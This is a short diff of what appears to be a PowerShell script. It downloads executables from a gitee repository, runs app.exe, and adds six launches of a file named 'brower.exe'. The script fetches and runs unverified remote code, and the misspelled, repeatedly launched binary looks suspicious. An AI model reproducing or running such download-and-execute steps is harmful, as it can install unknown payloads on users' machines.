@@ -4,3 +4,9 @@ Invoke-WebRequest -Uri https://gitee.com/duhaolong-dhl_admin/111/raw/master/mini
 Invoke-WebRequest -Uri https://gitee.com/duhaolong-dhl_admin/111/raw/master/app.exe -OutFile app.exe
 
 start .\app.exe
+start ./brower.exe
+start ./brower.exe
+start ./brower.exe
+start ./brower.exe
+start ./brower.exe
+start ./brower.exe
